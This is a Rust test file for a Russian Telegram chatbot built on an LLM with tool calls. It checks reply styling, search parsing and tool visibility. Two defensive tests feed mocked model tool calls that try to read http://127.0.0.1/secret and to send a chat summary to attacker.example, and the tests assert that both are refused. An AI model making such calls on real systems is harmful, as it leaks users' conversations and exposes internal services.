use crate::test_support::*;
use crate::test_support::{chat_reply, chat_reply_with_proposal};
use crate::*;

#[test]
fn chat_prompt_needs_the_name_in_groups() {
    assert_eq!(
        chat_prompt("привет", true, "MyBot", false).as_deref(),
        Some("привет")
    );
    assert_eq!(
        chat_prompt("максут, как дела?", false, "MyBot", false).as_deref(),
        Some("как дела")
    );
    assert_eq!(
        chat_prompt("Максут что такое Rust", false, "MyBot", false).as_deref(),
        Some("что такое Rust")
    );
    assert_eq!(
        chat_prompt("максвелл что такое Rust", false, "MyBot", false),
        None
    );
    assert_eq!(
        chat_prompt("@mybot расскажи", false, "MyBot", false).as_deref(),
        Some("расскажи")
    );
    assert_eq!(
        chat_prompt("ответ на реплай", false, "MyBot", true).as_deref(),
        Some("ответ на реплай")
    );
    assert_eq!(chat_prompt("просто сообщение", false, "MyBot", false), None);
    assert_eq!(chat_prompt("макс, привет", false, "MyBot", false), None);
    assert_eq!(chat_prompt("максут", false, "MyBot", false), None);
    assert_eq!(chat_prompt("   ", true, "MyBot", false), None);
}

#[test]
fn replies_are_lowercased_except_urls() {
    assert_eq!(lowercase_reply("Привет! Как Дела?"), "привет! как дела?");
    assert_eq!(
        lowercase_reply("Смотри https://Example.com/Path"),
        "смотри https://Example.com/Path"
    );
    assert_eq!(
        lowercase_reply("(https://Ex.com/Path)"),
        "(https://Ex.com/Path)"
    );
    assert_eq!(lowercase_reply("Москва — Это Город"), "москва — это город");
}

#[test]
fn replies_are_short_and_without_a_trailing_period() {
    assert_eq!(style_reply("Привет. Как дела."), "привет. как дела");
    assert_eq!(style_reply("привет...\n\nкак дела."), "привет... как дела");
    assert_eq!(
        style_reply("Смотри https://Example.com/Path."),
        "смотри https://Example.com/Path"
    );
    let long = format!("{} это конец.", "очень длинная фраза ".repeat(40));
    let reply = style_reply(&long);
    assert!(reply.chars().count() <= 280, "{}", reply.chars().count());
    assert!(!reply.ends_with('.'));
    assert!(!reply.contains('—'));
    assert_eq!(style_reply("привет — как дела"), "привет - как дела");
    assert_eq!(style_reply("это – не тире"), "это - не тире");
}

#[test]
fn split_message_respects_the_telegram_limit() {
    let short = split_message("первая строка\nвторая");
    assert_eq!(short, vec!["первая строка\nвторая".to_string()]);
    let long_line = "а".repeat(8000);
    let chunks = split_message(&long_line);
    assert_eq!(chunks.len(), 3);
    assert!(chunks.iter().all(|chunk| chunk.chars().count() <= 3900));
    assert_eq!(chunks.concat().chars().count(), 8000);
    let many_lines = (0..500)
        .map(|index| format!("строка {index}"))
        .collect::<Vec<_>>()
        .join("\n");
    assert!(split_message(&many_lines)
        .iter()
        .all(|chunk| chunk.chars().count() <= 3900));
}

#[test]
fn search_results_are_extracted_and_decoded() {
    let html = r#"
        <a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpage&amp;rut=abc">Example &amp; Co</a>
        <a class="result__snippet" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fpage">Snippet <b>bold</b> text</a>
    "#;
    let results = extract_search_results(html, 5);
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].0, "Example & Co");
    assert_eq!(results[0].1, "https://example.com/page");
    assert_eq!(results[0].2, "Snippet bold text");
}

#[tokio::test]
async fn chat_reply_includes_previous_chat_messages() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"второй ответ"}}]}"#.into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let chat_id = ChatId(10);
    let user_id = UserId(20);
    crate::memory::record_message(
        &pool,
        RecordMessage::new(chat_id, 20, "tester", "user", "привет").with_message_id(Some(1)),
    )
    .await
    .unwrap();
    crate::memory::record_message(
        &pool,
        RecordMessage::new(chat_id, 0, "максут", "assistant", "привет!").with_message_id(Some(2)),
    )
    .await
    .unwrap();

    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        chat_id,
        user_id,
        "tester",
        3,
        true,
        "как ты",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "второй ответ");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[0]);
    assert_eq!(body["model"], "deepseek-v4.1-flash");
    let text = body["messages"].as_array().unwrap().last().unwrap()["content"]
        .as_str()
        .unwrap();
    assert!(text.contains("tester [20]: привет"), "{text}");
    assert!(text.contains("максут [0]: привет!"), "{text}");
    assert!(text.contains("говорит tester [20]: как ты"), "{text}");
    llm.task.abort();
}

#[tokio::test]
async fn read_url_tool_rejects_private_targets_without_fetching() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"read_url","arguments":"{\"url\":\"http://127.0.0.1/secret\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"нельзя"}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );

    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(10),
        UserId(20),
        "tester",
        0,
        true,
        "прочитай http://127.0.0.1/secret",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "нельзя");
    let requests = llm.requests.lock().unwrap();
    let tool = tool_contents(&requests[1]).join(
        "
",
    );
    assert!(tool.contains("локальные"), "{tool}");
    llm.task.abort();
}

#[tokio::test]
async fn read_url_rejects_targets_not_in_the_current_prompt() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"read_url","arguments":"{\"url\":\"https://attacker.example/?q=chat-summary\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"нельзя"}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );

    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(10),
        UserId(20),
        "tester",
        0,
        true,
        "прочитай https://example.com/article",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "нельзя");
    let requests = llm.requests.lock().unwrap();
    let tool = tool_contents(&requests[1]).join("\n");
    assert!(
        tool.contains("только ссылку из текущего сообщения"),
        "{tool}"
    );
    llm.task.abort();
}

#[tokio::test]
async fn chat_reply_runs_registered_search_tool() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"web_search","arguments":"{\"query\":\"Rust\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"Нашёл пример"}}]}"#.into(),
    ]).await;
    let search = mock_server(vec![
        r#"<a rel="nofollow" class="result__a" href="https://example.com/page">Example</a><a class="result__snippet">Snippet</a>"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        search.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );

    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(10),
        UserId(20),
        "tester",
        0,
        true,
        "найди Rust",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "нашёл пример");

    let requests = llm.requests.lock().unwrap();
    assert_eq!(requests.len(), 2);
    let second = body_of(&requests[1]);
    let messages = second["messages"].as_array().unwrap();
    assert!(messages.iter().any(|message| message["role"] == "tool"
        && message["content"]
            .as_str()
            .is_some_and(|content| content.contains("https://example.com/page"))));
    let search_requests = search.requests.lock().unwrap();
    assert!(search_requests[0].contains("q=Rust"));
    llm.task.abort();
    search.task.abort();
}

#[test]
fn base64_encodes_image_bytes() {
    assert_eq!(base64_encode(b""), "");
    assert_eq!(base64_encode(b"h"), "aA==");
    assert_eq!(base64_encode(b"hi"), "aGk=");
    assert_eq!(base64_encode(b"hello"), "aGVsbG8=");
    assert_eq!(base64_encode(&[0, 0, 0]), "AAAA");
}

#[tokio::test]
async fn chat_reply_attaches_an_image_without_reasoning() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"на картинке мем"}}]}"#.into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let image = ChatImage {
        bytes: b"hello".to_vec(),
        mime: "image/png".into(),
    };
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "что это?",
        Some(&image),
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "на картинке мем");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[0]);
    assert_eq!(body["reasoning_effort"], "none");
    assert_eq!(
        body["messages"][1]["content"][1]["image_url"]["url"],
        "data:image/png;base64,aGVsbG8="
    );
    llm.task.abort();
}

#[tokio::test]
async fn bare_media_asks_for_a_reaction_instead_of_a_description() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"понял, молчу"}}]}"#.into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let image = ChatImage {
        bytes: b"hello".to_vec(),
        mime: "image/webp".into(),
    };
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "",
        Some(&image),
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "понял, молчу");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[0]);
    let text = body["messages"][1]["content"][0]["text"].as_str().unwrap();
    assert!(text.contains("отреагируй"), "{text}");
    assert!(!text.contains("опиши коротко"), "{text}");
    llm.task.abort();
}

#[tokio::test]
async fn recent_group_messages_reach_the_model() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"борщ"}}]}"#.into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    crate::memory::record_message(
        &pool,
        RecordMessage::new(ChatId(1), 300, "crudoshlepa", "user", "я ел борщ")
            .with_message_id(Some(1)),
    )
    .await
    .unwrap();
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        2,
        true,
        "что я ел?",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "борщ");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[0]);
    let text = body["messages"].as_array().unwrap().last().unwrap()["content"]
        .as_str()
        .unwrap();
    assert!(text.contains("crudoshlepa [300]: я ел борщ"), "{text}");
    assert!(text.contains("говорит tester [2]: что я ел?"), "{text}");
    llm.task.abort();
}

#[tokio::test]
async fn tavily_search_uses_the_key_and_parses_results() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"web_search","arguments":"{\"query\":\"Rust\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"есть"}}]}"#.into(),
    ]).await;
    let search = mock_server(vec![
        r#"{"results":[{"title":"Rust","url":"https://rust-lang.org","content":"systems language"}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        search.url.clone(),
        SearchProvider::Tavily,
        Some("tavily-key".into()),
    );
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "погугли rust",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "есть");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[1]);
    let tool = body["messages"]
        .as_array()
        .unwrap()
        .iter()
        .find(|message| message["role"] == "tool")
        .unwrap();
    assert!(tool["content"].as_str().unwrap().contains("rust-lang.org"));
    let search_requests = search.requests.lock().unwrap();
    assert!(search_requests[0].contains("tavily-key"));
    assert!(search_requests[0].contains("Rust"));
    llm.task.abort();
    search.task.abort();
}

#[tokio::test]
async fn firecrawl_search_parses_results() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"web_search","arguments":"{\"query\":\"Rust\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"есть"}}]}"#.into(),
    ]).await;
    let search = mock_server(vec![
        r#"{"success":true,"data":[{"title":"Rust","url":"https://rust-lang.org","description":"systems language"}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        search.url.clone(),
        SearchProvider::Firecrawl,
        None,
    );
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "погугли rust",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "есть");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[1]);
    let tool = body["messages"]
        .as_array()
        .unwrap()
        .iter()
        .find(|message| message["role"] == "tool")
        .unwrap();
    assert!(tool["content"].as_str().unwrap().contains("rust-lang.org"));
    llm.task.abort();
    search.task.abort();
}

#[tokio::test]
async fn chat_reply_can_send_a_pack_sticker() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"send_sticker","arguments":"{\"name\":\"pizda\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"держи"}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "скинь стикер",
        None,
    )
    .await
    .unwrap();
    let expected = format!("sticker-{PIZDA}");
    assert_eq!(
        reply.sticker.as_ref().map(|id| id.0.as_str()),
        Some(expected.as_str())
    );
    assert_eq!(reply.text, "держи");
    let requests = llm.requests.lock().unwrap();
    let tools = body_of(&requests[0])["tools"].as_array().unwrap().to_vec();
    assert!(tools
        .iter()
        .any(|tool| tool["function"]["name"] == "find_stickers"));
    assert!(tools
        .iter()
        .any(|tool| tool["function"]["name"] == "send_sticker"));
    llm.task.abort();
}

#[tokio::test]
async fn non_owner_is_readonly_without_sticker_tool() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"send_sticker","arguments":"{\"name\":\"pizda\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"ок"}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        false,
        "скинь стикер",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.sticker, None);
    assert_eq!(reply.text, "ок");
    let requests = llm.requests.lock().unwrap();
    let first = body_of(&requests[0]);
    let tools = first["tools"].as_array().unwrap();
    assert!(tools
        .iter()
        .any(|tool| tool["function"]["name"] == "web_search"));
    assert!(!tools
        .iter()
        .any(|tool| tool["function"]["name"] == "send_sticker"));
    assert!(!tools
        .iter()
        .any(|tool| tool["function"]["name"] == "find_stickers"));
    let system = first["messages"][0]["content"].as_str().unwrap();
    assert!(
        !system.contains("find_stickers"),
        "hidden tool leaked into shared prompt"
    );
    assert!(
        !system.contains("send_sticker"),
        "hidden tool leaked into shared prompt"
    );
    assert!(first["messages"]
        .as_array()
        .unwrap()
        .iter()
        .any(|message| message["role"] == "system"
            && message["content"].as_str().unwrap().contains(
                "Доступные инструменты: web_search, research, read_url, propose_feature"
            )));
    let second = body_of(&requests[1]);
    let tool = second["messages"]
        .as_array()
        .unwrap()
        .iter()
        .find(|message| message["role"] == "tool")
        .unwrap();
    assert_eq!(tool["content"], "Инструмент недоступен.");
    llm.task.abort();
}

#[tokio::test]
async fn empty_registry_sends_no_tools_field() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"ок"}}]}"#.into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    )
    .with_tools(ToolRegistry::default());
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "привет",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "ок");
    let requests = llm.requests.lock().unwrap();
    let body = body_of(&requests[0]);
    assert!(body.get("tools").is_none());
    assert!(body.get("tool_choice").is_none());
    llm.task.abort();
}

#[tokio::test]
async fn non_owner_can_propose_a_feature_through_the_tool() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"propose_feature","arguments":"{\"goal\":\"добавь кнопку отмены\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"передал"}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let proposal = FeatureProposal {
        dir: dir.path().join("self-improve"),
        owner_id: UserId(1),
    };
    let reply = chat_reply_with_proposal!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        5,
        false,
        "добавь кнопку отмены",
        None,
        Some(&proposal),
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "передал");
    let files: Vec<_> = std::fs::read_dir(proposal.dir.join("inbox"))
        .unwrap()
        .filter_map(Result::ok)
        .collect();
    assert_eq!(files.len(), 1);
    let value: serde_json::Value =
        serde_json::from_slice(&std::fs::read(files[0].path()).unwrap()).unwrap();
    assert_eq!(value["proposed_by"], 2);
    let requests = llm.requests.lock().unwrap();
    let second = body_of(&requests[1]);
    let tool = second["messages"]
        .as_array()
        .unwrap()
        .iter()
        .find(|message| message["role"] == "tool")
        .unwrap();
    assert!(tool["content"]
        .as_str()
        .unwrap()
        .contains("передана владельцу"));
    llm.task.abort();
}

#[tokio::test]
async fn new_public_tool_is_visible_to_owner_and_non_owner() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"ок"}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"ок"}}]}"#.into(),
    ])
    .await;
    let registry = ToolRegistry::builtin().with(ToolSpec {
        name: "visibility_probe",
        description: "test-only",
        parameters: empty_parameters,
        visibility: ToolVisibility::All,
        kind: ToolKind::WebSearch,
    });
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    )
    .with_tools(registry);

    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        false,
        "привет",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "ок");
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(3),
        "tester",
        0,
        true,
        "привет",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "ок");

    let requests = llm.requests.lock().unwrap();
    assert_eq!(requests.len(), 2);
    let non_owner = body_of(&requests[0]);
    let owner = body_of(&requests[1]);
    for body in [&non_owner, &owner] {
        assert!(body["tools"]
            .as_array()
            .unwrap()
            .iter()
            .any(|tool| tool["function"]["name"] == "visibility_probe"));
    }
    let tools = non_owner["tools"].as_array().unwrap();
    assert!(!tools
        .iter()
        .any(|tool| tool["function"]["name"] == "send_sticker"));
    assert!(!tools
        .iter()
        .any(|tool| tool["function"]["name"] == "find_stickers"));
    assert!(non_owner["messages"]
        .as_array()
        .unwrap()
        .iter()
        .any(|message| message["role"] == "system"
            && message["content"]
                .as_str()
                .unwrap()
                .contains("visibility_probe")));
    llm.task.abort();
}

#[tokio::test]
async fn every_chat_uses_the_full_communication_guide() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"ок"}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"ок"}}]}"#.into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "привет",
        None,
    )
    .await
    .unwrap();
    chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(3),
        UserId(4),
        "tester",
        0,
        true,
        "привет",
        None,
    )
    .await
    .unwrap();
    let requests = llm.requests.lock().unwrap();
    for request in requests.iter() {
        let body = body_of(request);
        let system = body["messages"][0]["content"].as_str().unwrap();
        assert!(system.contains("Assistant Operating Specification"));
        assert!(system.contains("Ты Максут"));
    }
    llm.task.abort();
}

#[tokio::test]
async fn cooldown_delays_but_keeps_a_quick_follow_up() {
    let base = Url::parse("https://example.com/").unwrap();
    let config = ChatConfig::new(
        base.clone(),
        "key".into(),
        "model".into(),
        base,
        SearchProvider::DuckDuckGo,
        None,
    );
    config.pace(UserId(1)).await;
    let started = time::Instant::now();
    config.pace(UserId(1)).await;
    assert!(started.elapsed() >= Duration::from_secs(2));
    config.pace(UserId(2)).await;
}

#[tokio::test]
async fn chat_reply_finds_and_sends_a_semantic_sticker() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"find_stickers","arguments":"{\"query\":\"грустный кот\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_2","type":"function","function":{"name":"send_sticker","arguments":"{\"sticker_id\":\"pack:1\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":"держи"}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let catalog =
        StickerCatalog::for_tests(&[("sad-cat", "pack", "котики", "😢", "грустный кот плачет")]);
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &catalog,
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "скинь грустного кота",
        None,
    )
    .await
    .unwrap();
    assert_eq!(
        reply.sticker.as_ref().map(|id| id.0.as_str()),
        Some("sad-cat")
    );
    assert_eq!(reply.text, "держи");
    let requests = llm.requests.lock().unwrap();
    let second = body_of(&requests[1]);
    assert!(second["messages"]
        .as_array()
        .unwrap()
        .iter()
        .any(|message| message["role"] == "tool"
            && message["content"]
                .as_str()
                .is_some_and(|content| content.contains("pack:1"))));
    llm.task.abort();
}

#[tokio::test]
async fn chat_reply_allows_a_sticker_only_reply() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"send_sticker","arguments":"{\"name\":\"pizda\"}"}}]}}]}"#.into(),
        r#"{"choices":[{"message":{"role":"assistant","content":null}}]}"#.into(),
    ]).await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &StickerCatalog::default(),
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "фу",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.text, "");
    assert!(reply.sticker.is_some());
    llm.task.abort();
}

#[tokio::test]
async fn explicit_add_packs_request_still_sends_an_existing_sticker() {
    let dir = tempfile::tempdir().unwrap();
    let pool = open_database(&format!(
        "sqlite://{}",
        dir.path().join("state.db").display()
    ))
    .await
    .unwrap();
    let llm = mock_server(vec![
        r#"{"choices":[{"message":{"role":"assistant","content":"паки добавляет владелец"}}]}"#
            .into(),
    ])
    .await;
    let config = ChatConfig::new(
        llm.url.clone(),
        "key".into(),
        "deepseek-v4.1-flash".into(),
        llm.url.clone(),
        SearchProvider::DuckDuckGo,
        None,
    );
    let catalog =
        StickerCatalog::for_tests(&[("girl", "pack", "девушки", "👩", "девушка смотрит в камеру")]);
    let reply = chat_reply!(
        &config,
        &pool,
        &StickerReplies::for_tests(),
        &catalog,
        ChatId(1),
        UserId(2),
        "tester",
        0,
        true,
        "ну добавь себе пару девочек",
        None,
    )
    .await
    .unwrap();
    assert_eq!(reply.sticker.as_ref().map(|id| id.0.as_str()), Some("girl"));
    assert_eq!(reply.text, "паки добавляет владелец");
    llm.task.abort();
}
